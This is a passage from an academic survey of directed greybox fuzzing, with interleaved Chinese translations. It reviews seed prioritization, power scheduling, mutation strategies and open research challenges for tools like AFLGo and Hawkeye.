coverage, and probability. Distance: As we can see from Table I, 32% (9/28) of the directed fuzzers prioritize seeds based on distance and give preference to the seeds that are closer to the target. As a groundbreaking work, AFLGo instruments the source code at compile-time and calculates the distances to the target basic blocks by the number of edges in the call graph and control-flow graphs of the PUT. Then at run-time, it aggregates the distance values of each exercised basic block to compute an average value to evaluate the seed. Many followups inherit this distance-based scheme, such as ParmeSan, and 1DVUL. TOFU’s distance metric is defined as the number of correct branching decisions needed to reach the target. RDFuzz combines distance with frequency to prioritize seeds. The code areas are separated into highfrequency and low-frequency areas by counting the execution frequency. The inputs are classified into high/low distance and high/low frequency four types. In the exploration phase, the low-frequency seeds are prioritized to improve the coverage, and for the exploitation phase, the low distance seeds are preferred to achieve the target code areas. UAFuzz is a tailored directed greybox fuzzer for complex behavioral use-after-free vulnerabilities. Different from the distance based on the control-flow graph, it uses a distance metric of call chains leading to the target functions that are more likely to include both allocation and free functions. W¨ustholz et al uses an online static lookahead analysis to determine a path prefix for which all suffix paths cannot reach a target location. By stressing the path prefix that might reach the target locations, the power schedule of the fuzzer can allocate its resources more strategically. One drawback of the distance-based method is that it only focuses on the shortest distance. When there is more than one path reaching the same targets, the longer options might be ignored, leading to a deviation. We will illustrate it with an example in Section IV-D. Similarity &amp; Coverage: In addition to distance, similarity is another useful metric, which indicates the coverage of certain target forms, such as functions, locations, and bug traces. This metric is particularly suitable when there are many targets. Hawkeye leverages a static analysis of the PUT and combines the basic block trace distance with covered function similarity for the seed prioritization and power scheduling. LOLLY uses a user-specified program statement sequence as the target and takes the seed’s ability of covering the target sequences (i.e., sequence coverage) as a metric to evaluate the seed. UAFL uses the operation sequence coverage as the feedback to guide the testcase generation to progressively cover the operation sequences that are likely to trigger use-after-free vulnerabilities. UAFuzz also uses a sequenceness-aware target similarity metric to measure the similarity between the execution of a seed and the target UAF bug trace. The sequenceness-aware target similarity metric concretely assesses how many targets a seed execution trace covers at runtime and takes ordering of the targets into account. Berry takes into account the coverage of nodes in the target sequences and their execution context. It enhances the target sequences with necessary nodes, namely the basic blocks required to reach the nodes in the target sequences for all paths. In addition to the branch coverage, Berry also considers the similarity between the target execution trace and the enhanced target sequence to prioritize the seeds. SAVIOR prioritizes seeds that have higher potentials to trigger vulnerabilities based on the coverage of labels predicted by UBSan. TortoiseFuzz differentiates edges that are more likely to be destined vulnerable based on the fact that memory corruption vulnerabilities are closely related to sensitive memory operations. It prioritizes inputs by a combination of coverige and security impact, which is represented by the memory operations on three different types of granularity at function, loop, and basic block. Probability: Probability is another useful metric that prioritizes the seed by how likely to reach the targets. It usually combines the seed prioritization metric with the target identification metric to direct fuzzing towards potentially vulnerable locations. V-Fuzz and SUZZER predicts the vulnerable probability of functions based on a deep learningbased model and gives each basic block in the vulnerable function a static score. Then for each input, it calculates the sum of the static score of all the basic blocks on its execution path and prioritizes the inputs with higher scores. SAVIOR leverage UBSan to label code areas with buggy potentials. TAFL strengthens fuzzing toward regions that have a higher probability of containing vulnerabilities, which is based on static semantic metrics including sensitive, complex, deep and rare-to-reach regions. 现代文献中广泛采用的三个种子优先级的度量标准：距离、覆盖率和概率。 Distance 从表1可以看出，32%（9/28）的定向模糊器根据距离对种子进行排序，并优先选择距离目标较近的种子。 作为一项开创性的工作，AFLGo在编译时对源代码进行检测，并通过PUT的调用图和控制流图中的边数计算到目标基本块的距离。然后在运行时聚合每个基本块的距离值，以计算平均值来评估种子。许多后续版本继承了这种基于距离的方案，如Parmasan和1DVUL。 TOFU的距离度量定义为达到目标所需的正确分支决策数。RDFuzz将距离和频率结合起来，对种子进行优先级排序。通过计算代码的执行频率，将代码区分为高频区和低频区。输入分为高/低距离和高/低频四种类型。在探测阶段，优先选择低频种子来提高覆盖率；在开发阶段，优先选择低距离种子来实现目标编码区域。UAFuzz是一个定制的定向灰盒模糊测试程序，用于复杂的UAF漏洞。与基于控制流图的距离不同，它使用了通向目标函数的调用链的距离度量，目标函数更可能同时包含分配函数和释放函数。 W¨ustholz et al使用online static lookahead analysis来找到并避免那些所有后缀路径都无法到达目标位置的路径前缀。通过强调可能到达目标位置的路径前缀，模糊测试程序的能量调度可以更有策略地分配其资源。 基于距离的方法的一个缺点是它只关注最短距离。当有多条路径到达同一目标时，可能会忽略较长的选项，从而导致偏差。 Similarity &amp; Coverage 除了距离，相似性是另一个有用的度量，它表示某些目标形式的覆盖范围，例如函数、位置和bug traces。当有许多目标时，这个指标特别适用。 Hawkeye利用对PUT的静态分析，并将基本块跟踪距离与覆盖函数相似性结合起来，用于种子优先级排序和能量调度。 LOLLY使用用户指定的程序语句序列作为目标，并将种子覆盖目标序列的能力（即序列覆盖率）作为评估种子的度量。 UAFL使用操作序列覆盖率作为反馈，引导测试用例生成逐步覆盖触发UAF漏洞可能使用的操作序列。 UAFuzz还使用序列感知目标相似性度量来度量种子执行和目标UAF bug traces之间的相似性。序列感知目标相似性度量具体评估了种子在运行时执行trace所覆盖的目标的数量和顺序。 Berry考虑了目标序列中节点的覆盖率及其执行上下文。它用必要的节点来增强目标序列，即到达所有路径的目标序列中的节点所需的基本块。除了分支覆盖之外，Berry还考虑了目标执行trace和增强目标序列之间的相似性，从而对种子进行优先级排序。 SAVIOR根据UBSan预测的标签覆盖率，优先考虑具有更高触发漏洞潜力的种子。 TortoiseFuzz基于内存损坏漏洞与敏感内存操作密切相关的事实，区分了更可能注定易受攻击的边缘。它通过覆盖率和安全影响因子的组合对输入进行优先级排序，这由函数、循环和基本块的三种不同粒度类型的内存操作表示。 Probability 概率是另一个有用的指标，它通过达到目标的可能性来确定种子的优先级。它通常将种子优先级度量与目标识别度量相结合，以将模糊化引向潜在的易受攻击的位置。 V-Fuzz和SUZZER基于一个通过深度学习的模型得到函数的脆弱概率，并给函数中的每个基本块一个静态分数。然后，对于每个输入，它计算其执行路径上所有基本块的静态得分之和，并对得分较高的输入进行优先级排序。 SAVIOR利用UBSan为代码区域添加可能存在bug的标签。 TAFL加强了对包含漏洞的概率较高的区域的模糊化，该模糊化基于静态语义度量，包括敏感、复杂、深入和罕见的区域。 Power Assignment After the seeds are selected and prioritized, the preferenced seeds are given more power, namely more chances of fuzzing tests. Although power assignment is crucial for DGF, very few works, try to optimize this step. AFLGo uses a simulated annealing-based power schedule to gradually assign more energy to seeds that are closer to the target locations while reducing energy for further away seeds. Unlike the traditional random walk scheduling that always accepts better solutions which may be trapped in a local optimum, simulated annealing accepts the solution which is not as good as the current one with a certain probability, so it is possible to jump out of the local optimum and reach the global optimal solution. Hawkeye also adopted simulated annealing but added prioritization. Thus, seeds closer to the target are mutated first, which further improves the directedness. LOLLY adopts an optimized simulated annealing-based power schedule to achieve maximum sequence coverage. Controlled by a temperature threshold, the cooling schedule in the exploration stage randomly mutates the provided seeds to generate many new inputs, while in the exploitation stage, it generates more new inputs from seeds that have higher sequence coverage. AFLGo使用一种基于模拟退火的能量调度，逐渐将更多的能量分配给距离目标位置较近的种子，同时减少距离较远的种子的能量。传统的随机游走调度总是接受更好的解从而可能陷入局部最优，而模拟退火则以一定的概率接受不如当前最优解的解，因此有可能跳出局部最优解而达到全局最优解。Hawkeye也采用了模拟退火，但增加了优先级。因此，更接近目标的种子首先发生变异，这进一步提高了方向性。LOLLY采用了一种优化的基于模拟退火的能量调度来实现最大的序列覆盖。在温度阈值的控制下，探测阶段的会随机地对所提供的种子进行变异以产生许多新的输入；而在开发阶段，它会从具有更高序列覆盖率的种子中产生更多的新输入。 Mutator Scheduling Some fuzzers (8 out of 28) optimize mutation strategies to assist directed fuzzing, which is mainly realized by classifying the mutators into different granularities. Hawkeye leverages an adaptive mutation strategy, which categorizes the mutators as coarse-grained and fine-grained. Coarse-grained mutators are used to change bulks of bytes during the mutations, while fine-grained only involve a few byte-level modifications, insertions, or deletions. It gives less chance of coarse-grained mutations when a seed can reach the target function. Once the seed reaches targets, the times of doing fine-grained mutations increase, and coarse-grained mutations decrease. In practice, the scheduling of mutators is controlled by empirical values. Similarly, V-Fuzz classify the mutation strategies into slight mutation and heavy mutation and dynamically adjust the mutation strategy via a threshold according to the actual fuzzing states. SemFuzz performs a resemble classification, except it focuses on the syscall. SemFuzz utilizes coarse mutation on the inputs to find a syscall sequence that can move the execution towards the “vulnerable functions”. After that, it switches to a fine-grained mutation on the syscall sequence to monitor the “critical variables”. TAFL also adopts granularity-aware scheduling of mutators based on an empirical observation that (1) coarse-grained mutators outperforms fine-grained mutators on path growth; (2) combining multiple mutators performs better than using a single kind of mutator. ProFuzzer entails different mutation policies according to the input field types recognized by input type probing. 一些模糊程序（8/28）优化变异策略来辅助定向模糊测试，这主要是通过将变异分类成不同的粒度（类型）来实现的。 Hawkeye利用了一种自适应变异策略，将变异分为粗粒度和细粒度。粗粒度的变异在突变期间会更改大量字节，而细粒度的变异只涉及少量字节级的修改、插入或删除。当一个种子接近目标函数时，粗粒度变异的机会就变少。一旦种子达到目标函数，进行细粒度变异的次数增加，而粗粒度变异的次数减少。 同样，V-Fuzz将变异策略分为轻微变异和严重变异，并根据实际模糊测试的状态通过阈值动态调整变异策略。 SemFuzz执行类似的分类，只是它关注于系统调用。SemFuzz利用对输入的粗变异来找到一个系统调用序列，该序列可以将执行移向易受攻击的函数。之后，它将切换到syscall序列上的细粒度变异，以监视关键变量。 TAFL还采用了基于经验观察的粒度感知的变异调度，即：粗粒度变异在路径增长方面优于细粒度变异；组合多个变异的性能优于使用单一类型的变异。 ProFuzzer根据输入类型探测识别的输入字段类型，如何进行不同的变异策略。 Data-flow Analysis Data-flow analysis, such as taint analysis, can reflect the effect of mutation in the generated inputs, thus, it is helpful to optimize mutation strategy and input generation. RDFuzz leverages a disturb-and-check method to identify and protect the distance sensitive content from the input, which is vital to maintain the distance. Preventing such content during mutation can help to approach the target code location more efficiently. UAFL adopts an information flow analysis to identify the relationship between the input and the program variables in the conditional statement, and assigns higher mutation possibility for these input bytes with high information flow strength, as they are more likely to change the values of target statement. SemFuzz tracks the kernel function parameters that the critical variables depend on via backward data-flow analysis. SeededFuzz utilizes dynamic taint analysis to identify the bytes of seeds which can influence values at security-sensitive program sites. PFUZZER uses dynamic tainting of inputs to relate each value processed to the input characters it is derived from. TIFF infers input type by means of in-memory data-structure identification and dynamic taint analysis, which increases the probability of triggering memory corruption vulnerabilities by type-based mutation. Nevertheless, data-flow analysis usually enlarges the run-time overhead. 数据流分析（如污点分析）可以反映变异对生成输入的影响，有助于优化变异策略和输入生成。 RDFuzz利用一种干扰-检查方法来识别和保护对输入的距离敏感的内容，这对保持距离至关重要（该句不太理解，可能翻译错误）。在变异过程中防止这些内容有助于更有效地接近目标代码位置。 UAFL采用信息流分析来识别条件语句中的输入和程序变量之间的关系，并为那些信息流更多的输入字节赋予更高的变异可能性，因为它们更可能改变目标语句的值。 SemFuzz通过反向数据流分析跟踪关键变量所依赖的核函数参数。 SeedFuzz利用动态污点分析来识别种子中可能影响security-sensitive程序位置的值的字节。 PFUZZER使用输入的动态污染，将处理的每个值与其派生的输入字符相关联。 TIFF通过内存中的数据结构识别和动态污点分析来推断输入类型，这增加了基于类型的变异触发内存损坏漏洞的概率。 当然，数据流分析通常会增加运行时开销。 Challenges and Solutions DFG中现在的挑战及可能的解决方案。 Binary Code Support Most of the known DGF works are implemented on top of AFL and inherit its compile-time instrumentation scheme to feedback the execution status or calculate the distance-based metric. A significant drawback of such a scheme is the dependence of the PUT source code. Thus, such scheme is unsuitable for testing scenes that the source code is unavailable, such as the commercial off-the-shelf (COTS) software, or the security-critical programs that rely partly on third-party libraries. The binary-level DGF is less prevalent owing to the following reasons. First, heavy runtime overhead. A straightforward solution for the binary code testing is leveraging a full-system emulator. For example, UAFuzz handles binary codes and extract execution paths via QEMU. However, emulator-based tools are usually less efficient. For example, the execution speed of vanilla AFL is 2X - 5X faster than its QEMU mode. Second, difficulty in collecting target information. For an open sourced PUT, we can obtain targets information from various channels, such as the CVE vulnerability descriptions, changes made in the git commit logs, and human experience on critical sits in the source code. However, for a PUT in the binary code, we can only extract targets information from bug traces. Third, difficulty in labeling the targets. For the source code instrumentation approach, the targets can be labeled based on the source code (e.g., cxxfilt.c, line 100). However, the thing is much more difficult for the binary-level approach. Since the binary code is hard to read, we have to disassemble it, such as IDA Pro, and label the targets with the virtual addresses. However, this is inconvenient and time-consuming. A viable solution to alleviate the performance limitation is hardware assistance. Intel PT is a lightweight hardware feature in recent Intel processors. It captures tracing data about program execution, which replaces the need for dynamic instrumentation. Intel PT can trace program execution on the fly with negligible overhead. Using the packet trace captured by Intel PT along with the corresponding binary of the PUT, a security analyst could fully reconstruct the PUT’s execution path. Averagely, the PT-based approach is 4.3x faster than QEMU-AFL. Previous hardware features such as Intel Last Branch Record also perform program tracing, but its output is stored in special registers instead of the main memory, which limits the trace size. There have been attempts of CGF with PT, such as kAFL, PTfuzz, Ptrix, and Honggfuzz. However, PT has never been used to DGF yet. For the problem of target identification and labeling at binary code level, we can leverage the machine-learningbased approach, or heuristic binary diffing approach to automatically identify the vulnerable code. 大多数已知的DGF都是在AFL的基础上实现的，并继承其编译时插桩方案来反馈执行状态或计算基于距离的度量。这种方案的一个显著缺点是对PUT源代码的依赖性。因此，这种方案不适合没有测试源代码的场景，例如商用闭源COTS软件或部分依赖第三方库的关键程序。 二进制级别的DGF存在以下问题。 1. 运行时开销很大。最简单的二进制代码模糊测试就是利用一个完整的系统仿真器。例如，UAFuzz处理二进制代码，并通过QEMU提取执行路径。然而，基于仿真器的工具通常效率较低。例如，vanilla AFL的执行速度比其QEMU模式快2倍到5倍。 2. 目标信息收集困难。开源PUT可以从各种渠道获取目标信息，例如CVE漏洞描述、git提交日志中所做的更改以及源代码中关键位置的注释。但是，对于二进制代码中的PUT，只能从bug trace中提取目标信息。 3. 标靶困难。对于源代码插桩方法，可以基于源代码标记目标（例如，cxxfilt.c，第100行）。然而，由于二进制代码很难读取，必须对其进行反汇编，如使用idapro，并用虚拟地址标记目标。 一个可行解决方案是通过硬件辅助减轻性能限制。Intel PT是最新Intel处理器中的一种轻量级硬件功能。它捕获有关程序执行的trace数据，从而取代了对动态插桩的需要。Intel PT可以动态跟踪程序执行，开销可以忽略不计。 安全分析人员通过Intel PT捕获的数据包trace以及PUT的二进制文件可以重建PUT的执行路径。平均而言，基于PT的方法比QEMU-AFL快4.3倍。以前的硬件功能（如Intel Last Branch Record）也可以执行程序跟踪，但其输出存储在特殊寄存器中，而不是主内存中，这限制了跟踪大小。CGF与PT的结合也有尝试，比如kAFL、PTfuzz、Ptrix和Honggfuzz。然而，PT从未被用于DGF。 对于二进制代码级别的目标识别和标记问题，可以利用基于机器学习的方法或启发式二进制差分方法来自动识别易受攻击的代码。 Automatic target identification Most of the known directed fuzzers require the analyst to mark the targets manually (e.g., AFLGo, Hawkeye). They rely on the prior knowledge of the target sites, such as the line number in the source code or the virtual memory address at the binary level, to label the target and steer the execution to the desired locations. However, to obtain such prior knowledge is challenging, especially for the binary code. Among the works we investigated, about 43% (12/28) of them try to optimize the way how the targets are identified. Researchers use auxiliary metadata, such as changes made in the PUT code based on git commit logs, information extracted from bug traces, or information from CVE vulnerability descriptions to identify targets. Nevertheless, they still rely on manual efforts to process the information and mark the target on the PUT. It is unsuitable when fuzzing a PUT for the first time or when well-structured information is unavailable. To achieve automatic target identification, we can use static analysis tools to find potential dangerous areas in the PUT. However, these tools are often specific to the bug types and programming languages used. Another direction is leveraging the compiler sanitizer passes, such as UBSan, to annotate potential bugs in the PUT. For binary code, 1DVUL identifies patch-related target branches by extracting different functions as well as their different basic blocks through binary-level comparison based on Bindiff. A deep learning-based method is also effective in predicting the vulnerability and using the prediction information to guide fuzzing. Finally, attack surface identification component is also useful to identify vulnerable targets for DGF automatically. 大多数已知的定向模糊程序都要求分析人员手动标记目标（如AFLGo、Hawkeye），这依赖对于目标位置的先验知识，例如源代码中的行号或二进制级别的虚拟内存地址，来标记目标并将执行引导到所需的位置。 为了实现目标的自动识别，可以使用静态分析工具在PUT中找到潜在的危险区域。然而，这些工具通常特定于所使用的bug类型和编程语言。另一个方向是利用compiler sanitizer passes，比如UBSan，来注释PUT中的潜在bug。对于二进制代码，1DVUL通过基于Bindiff的二进制级比较，提取不同的函数及其不同的基本块，识别与补丁相关的目标分支。基于深度学习的方法在预测脆弱性和使用预测信息指导模糊化方面也是有效的。最后，攻击面识别组件也可用于自动识别DGF的易受攻击目标。 Differentiated weight metric In most of the state-of-the-art directed greybox fuzzers, the prioritization of seeds is based on equal-weight metrics. Take the widely used distance-based metric as an example, the ability to reach the target is measured by the distance between the seed and the target. Specifically, the distance is represented by a number of edges, namely the transitions among basic blocks. However, such measurement ignores the fact that different branch jumps have different probabilities to take. Thus, such inaccuracy limits the performance of directed fuzzing. We use the following example to illustrate the difference. Figure 1 shows a control-flow graph fragment, in which the input x is an integer ranges from 0 to 9. It is easy to know that the probability of jumping from node A to node C is 0.1, and from node A to node B is 0.9. We can also compute the probabilities of other jumps by the branch conditions. For the distance calculation based on the number of branch jumps, the distance of A → C is shorter than that of A → G. This is because A → C has only one jump but A → G has three jumps. However, when we take the branch jump probability into account, the probability of A → C is 0.1. However, the probability of A → G is 0.9 × 0.7 × 0.5 ≈ 0.3, which is more likely to be taken than A → C and should be considered as has a “shorter” distance. Thus, it is more reasonable to consider the weight difference as well when calculating the distance to guide the seed prioritization. The other seed prioritization metrics, such as similarity and probability, should follow the same rationale. One possible solution is taking the branch jump probability into account. When evaluating the reachability of the target based on probability, each seed is prioritized based on how likely the seed can generate an input to reach the target, namely the probability of converting the current execution path of this seed to a target path that goes through the target. Since an execution path can be viewed as a Markov Chain of successive branches, the probability of a path can be calculated by gathering the probabilities of all the branches within the path. We can estimate the branch probability by statistically calculating the ratio based on the Monte Carlo method. The density of the stationary distribution formally describes the likelihood that the fuzzer exercises a certain path after a certain number of iterations. A Monte Carlo based method requires two conditions: 1) the sampling should be random; 2) the sample scale should be large. Fortunately, the fuzzing process by nature fulfills these requirements. The execution paths motivated by randomly mutated testcases can be viewed as random samples, which met the first requirement. The high throughput of the testcases generated by fuzzers makes the estimation statistically meaningful, satisfying the second requirement. Thus, regarding fuzzing as a sampling process, we can statistically estimate the branch jump probability in a lightweight fashion. One possible drawback of such a probability-based approach is the potential run-time overhead. Both the statistical jump counting and the probability calculation introduce extra computation. A simple way to alleviate performance deduction is interval sampling. Another possible solution is to accelerate the computation, which involves how the metadata is stored and accessed. Conventionally, graph-based data is stored in an adjacency table. However, since the probabilitybased approach updates the jump statistics very often and the reachability judgment also requires a quick edge tracing, thus, the adjacency table is unsuitable owing to its low efficiency when accessing data. Another option is the adjacency matrix, which supports quick data access. However, since a jump usually has two branches, the matrix would be vast but the data distribution is relatively sparse, which increases space consumption dramatically. Thus, a pre-condition to leverage a probability-based approach is designing a customized data structure that balances the time complexity and space complexity. 在大多数最先进的定向灰盒模糊器中，种子的优先级是基于等权度量的。以广泛应用的距离度量为例，通过种子与目标之间的距离来度量到达目标的能力。特别是距离由多条边表示，即基本块之间的过渡。然而，这样的测量忽略了一个事实，即不同的分支跳跃有不同的概率。因此，这种不精确性限制了定向模糊的性能。 图1显示了一个控制流图片段，其中输入x是一个从0到9的整数。很容易知道从节点A跳到节点C的概率是0.1，从节点A跳到节点B的概率是0.9。如果据根据分支跳数计算距离，则A→C的距离比A→G短，这是因为A→C只有一个跳，而A→G有三个跳。但是如果考虑分支跳跃概率，则A→C的概率为0.1，而A→G的概率为0.9×0.7×0.5≈0.3，这比A→C更“短”。因此，在计算距离以指导种子排序时，考虑权重差异也更为合理。其他种子优先级度量，如相似性和概率，应该遵循相同的原理。 一种可能的解决方案是考虑分支跳转概率。当基于概率评估目标的可达性时，每个种子基于该种子生成到达目标的输入的可能性，即将该种子的当前执行路径转换为穿过该目标的目标路径的概率来优先排序。由于执行路径可以看作是连续分支的马尔可夫链，因此可以通过收集路径中所有分支的概率来计算路径的概率。 基于Monte Carlo方法，可以通过统计计算分支概率来估计分支概率。平稳分布的密度形式上描述了模糊程序经过一定次数的迭代后执行某条路径的可能性。基于Monte Carlo方法需要两个条件：1）抽样应该是随机的；2）抽样规模应该很大。幸运的是，模糊过程本质上满足了这些要求。由随机变异的测试用例驱动的执行路径可以看作是满足第一个需求的随机样本。模糊程序生成的测试用例的高吞吐量使得估计具有统计意义，满足第二个需求。因此，将模糊化作为一个抽样过程，可以以一种轻量级的方式统计估计分支跳跃概率。 这种基于概率的方法的一个可能缺点是潜在的运行时开销。统计跳跃计数和概率计算都引入了额外的计算。减少性能降低的一个简单方法是间隔采样。 另一个可能的解决方案是加速计算，这涉及到元数据的存储和访问方式。传统上，基于图形的数据存储在邻接表中。然而，由于基于概率的方法经常更新跳跃统计信息，并且可达性判断也需要快速的边缘跟踪，因此邻接表在访问数据时效率较低，不适合使用。另一种选择是邻接矩阵，它支持快速数据访问。然而，由于一个跳转通常有两个分支，矩阵将是巨大的，但数据分布相对稀疏，这大大增加了空间消耗。 因此，利用基于概率的方法的先决条件是设计一个平衡时间复杂性和空间复杂性的定制数据结构。 Global Optimum Deviation When there are multi-targets in a DGF testing, How to coordinates these targets is another challenge. One strategy is seeking the global shortest distance based on Dijkstras algorithm, as AFLGo does. However, such global optimum might miss the local optimum seed that is closest to a certain target, leading to a deviation. We use the following example to illustrate the situation. Figure 2 shows a control-flow graph fragment, where node K and O are the target nodes. Here we test three seeds, one exercises path A→B→D→G→K, one exercises path A→C→E→I→M→N→O, and the other exercises path A→C→E→H→L. Based on the distance formula defined by B¨ohme et al., we have calculated the harmonic distances between each node in the three paths to the two targets and label them by the side of each node. The global distances of the three seeds are dABDGK, dACEIMNO, and dACEHL. Since dACEHL is the smallest among the three, we should prioritize the seed of path A→C→E→H→L. However, this is unreasonable because path A→B→D→G→K goes through target node K and path A→C→E→I→M→N→O goes through target O, but path A→C→E→H→L does not reach any targets. Intuitionally, path A→C→E→H→L is far away from the targets and should not be prioritized. Therefore, when there are multiple targets, finding the global shortest distance has deviation and affects the directedness of fuzzing. The reason behind such deviation is that the distancebased seed measurement only focuses on the shortest path. When there are multiple paths reaching the same target, the longer ones might be ignored, causing deviation in the result. In Figure 2, if we consider path A→C→K and path A→C→E→H→O. As expected, dACK &lt; dACEIMNO &lt; dACEIMNL. This is because path A→C→K and path A→C→E→H→O are the shortest paths to targets K and O, respectively. The shortest path is always prioritized. To avoid the bias in the evaluation of seeds, we should take into account all the potential paths to the targets. To achieve this goal, Hawkeye uses adjacent-function distance augmentation based on a lightweight static analysis, which considers the patterns of the (immediate) call relation based on the generated call graph. Another strategy of coordinating multi-targets is separating the targets. For each seed, only selecting the minimum distance among all the targets as the distance of the seed, and prioritize the seed based on this min-distance. In this way, we can avoid the local optimum deviation, but this might slow down the speed of reaching a specific target. 当DGF测试中存在多个目标时，如何协调这些目标是另一个挑战。 一种策略是基于Dijkstras算法来寻找全局最短距离，AFLGo就是这样做的。然而，这样的全局最优可能会错过最接近某个目标的局部最优种子，从而导致偏差。 图2显示了一个控制流图片段，其中节点K和O是目标节点。这里测试了三个种子，路径分别为：A→B→D→G→K，A→C→E→I→M→N→O，A→C→E→H→L。论文作者基于B¨ohme et al.定义的距离公式计算了两个目标的三条路径中每个节点之间的harmonic距离，并在每个节点的侧面标记它们。 路径A→C→E→H→L的种子应该是三个之中距离最小的，但这是不合理的，因为路径A→B→D→G→K穿过目标节点K，路径A→C→E→I→M→N→O穿过目标节点O，但路径A→C→E→H→L没有到达任何目标。直觉上，路径A→C→E→H→L远离目标，不应优先考虑。因此，当存在多个目标时，寻找全局最短距离存在偏差，影响模糊化的方向性。 这种偏差背后的原因是基于距离的种子测量只关注最短路径。当有多条路径到达同一目标时，可能会忽略较长的路径，从而导致结果出现偏差。 图2中，如果考虑路径A→C→K和路径A→C→E→H→O，会发现dACK &lt; dACEIMNO &lt; dACEIMNL。这是因为路径A→C→K和路径A→C→E→H→O分别是到目标K和O的最短路径。最短路径总是优先考虑的。为了避免在评估种子时产生偏差，应该考虑到所有可能到达目标的路径。为了实现这一目标，Hawkeye使用了基于轻量级静态分析的相邻函数距离扩充，该分析基于生成的调用图考虑（立即）调用关系的模式。 多目标协调的另一种策略是目标分离。对于每个种子，仅选择所有目标之间的最小距离作为种子的距离，并基于该最小距离对种子进行优先级排序。这样可以避免局部最优偏差，但可能会减慢达到特定目标的速度。 Missing Indirect Calls No matter what metric is adopted, DGF relies on controlflow analysis to prioritize the seed. Take the distance-based metric as an example, the distance is generally measured based on the control-flow graph and call graph. However, most researchers construct the control-flow graph and call graph statically via LLVM’s builtin APIs, and such graphs are incomplete due to missing indirect calls. In real-world programs, indirect function calls are prevalent. For example, in libpng, 44.11% of the function calls are indirect function calls. For the static analysis approaches, indirect function calls sites, such as passing a function pointer as a parameter in C or using function objects and pointers, cannot be observed directly from the source code or binary instructions. For the binary code, the target address of indirect calls depends on the values in the registers, which cannot be obtained either. Besides, to construct an inter-procedural control-flow graph, we need to combine each function’s control-flow graph generated based on LLVM’s IR with the call graph of the whole program. Therefore, the distance measurement based on the call graph and control-flow graph is inaccurate without the indirect calls, which affects DGF’s ability to reach the targets. For static approaches, one straightforward solution to this challenge is performing Andersen’s points-to analysis for function pointers. However, such inclusion-based context-insensitive pointer analysis causes an indirect call to have many outgoing edges, possibly yielding execution paths that are not possible for a given input. TOFU uses function type-signatures to approximate the callable set at each indirect-call site. However, it does not consider casts, which could allow a differently typed function to be called, introducing imprecision. For the dynamic situation, ParmeSan identifies the missing edges of indirect calls during real executions and compensates the call graph gradually. Finally, the graphs tend to be complete after enough number of fuzzing executions. However, such a solution inevitably enlarges the run-time overhead and cannot guarantee completeness. 无论采用何种度量，DGF都依赖于控制流分析来确定种子的优先级。以基于距离的度量为例，通常基于控制流图和调用图来度量距离。 然而，由于LLVM的调用流和通过LLVM的间接调用图的构造是不完整的。在实际程序中，间接函数调用非常普遍。例如，在libpng中，44.11%的函数调用是间接函数调用。对于静态分析方法，不能直接从源代码或二进制指令中观察到间接函数调用站点，例如在C中作为参数传递函数指针或使用函数对象和指针。对于二进制代码，间接调用的目标地址取决于寄存器中的值，这些值也无法获得。此外，为了构造一个过程间控制流图需要将基于LLVM的IR生成的每个函数的控制流图与整个程序的调用图结合起来。因此，基于呼叫图和控制流图的距离测量在没有间接呼叫的情况下是不准确的，影响了DGF到达目标的能力。 对于静态方法，解决这个问题的一个简单方法是对函数指针执行Andersen的points to analysis。但是，这种基于包含的上下文不敏感指针分析会导致间接调用具有许多传出边缘，可能会产生给定输入不可能的执行路径。 TOFU使用函数类型签名来近似每个间接调用站点的可调用集。但是，它不考虑类型转换，这可能会允许调用不同类型的函数，从而引入不精确性。 对于动态情况，ParmeSan在实际执行过程中识别间接调用的缺失边，并逐渐补全调用图。最后，在执行足够数量的模糊测试之后，图趋于完整。然而，这样的解决方案不可避免地增加了运行时开销，并且不能保证完整性。 Exploration-exploitation coordination The last challenge for DGF lies in coordinating the exploration-exploitation tradeoff. On the one hand, more exploration can obtain and provide adequate information for the exploitation; on the other hand, an overfull exploration would occupy many resources and delay the exploitation. It is difficult to determine the boundary between the exploration phase and the exploitation phase. In a word, we do not know when to stop exploration and begin the exploitation can perform the best. AFLGo adopts a fixed splitting of the exploration phase and the exploitation phase. The time budgets are pre-set in the test configuration before testing. Such a scheme is preliminary because the separation point is empirical and inflexible. Since each PUT has a different character, such fixed splitting is less adaptive. Once the exploration phase turns to the exploitation phase, there is no going back even if the direction performance is poor due to not enough paths. To illustrate how the splitting of the exploration phase and the exploitation phase affects the performance of DGF, we conduct a simple experiment with AFLGo on libxml. We use the “-z” parameter of AFLGo to set different time budget for the exploration phase and compare the performance. As Figure 3 shows, the horizontal coordinate shows the time duration of the test, and the vertical coordinate means the minimum distance of all the generated inputs to the target code areas (min-distance). A small min-distance indicates a better-directed performance. The experiments last for 24 hours, and AFLGo-1 means 1 hour of exploration with 23 hours of exploitation, and the rest are similar. From the results, we can conclude that the splitting of the exploration phase and the exploitation phase affects the performance of DGF, and the best performance (AFLGo-16) requires adequate time for both of the two phases. However, it is difficult to get an optimum splitting. Among the directed fuzzers we investigated, only one work tries to improve the coordination of exploration-exploitation. RDFuzz uses an intertwined schedule to conduct exploration and exploitation alternately. It counts the branch-level statistics during the execution to separate the code areas into high-frequency and low-frequency areas. Based on the two evaluation criterias of frequency and distance, the inputs are classified into high/low distance and high/low-frequency types. Low-frequency inputs are helpful to improve the coverage, which is required in the exploration; Low distance inputs are helpful to achieve the target code areas, which are favored in the exploitation. Finally, it uses an intertwined testing schedule to conduct the exploration and exploitation alternately. Another possible solution to this challenge is leveraging a dynamic strategy to coordinate the splitting of the exploration phase and the exploitation phase, which can adaptively switch between the exploration phase and the exploitation phase. To realize this scheme, we suggest to cast the splitting of fuzzing phases to the dividing of seeds, namely dividing the seeds into two groups: coverage seeds for exploration and directed seeds for exploitation. The number of seeds in each group indicates the energy spent on the corresponding phase. The coordination of the two phases is implemented by controlling the number of seeds in each group. We use a variable called dp to represent the percentage of directed seeds among all the seeds, which also indicates the percentage of energy that spends on the exploitation phase. We give labels to the coverage seeds during seed evaluation, and we give labels to directed seeds after every fuzzing cycle, adjusted by dp. We use Algorithm 2 to illustrate this design. A DGF with adaptive splitting should start from the exploration phase (dp = 0) that focuses on discovering new paths. Then, with the increasing of known paths, we gradually increase dp to invoke the exploitation phase, in which high-valued directed seeds are selected and prioritized to enhance the reachability based on dp. When the fuzzer can not find any new paths for a long duration, the exploration phase has come to a bottleneck, and we should quickly move to the exploitation phase by dramatically increasing dp. Similarly, we also need to move from the exploitation phase back to the exploration phase occasionally. For example, we are already at the exploitation phase and dp is very large (e.g., dp &gt; 0.9) but we cannot get any closer to the target for many fuzzing cycles, we should decrease dp dramatically to move back to the exploration phase. This is because the directed seeds in hand perform poorly, and we should enlarge path coverage to discover more 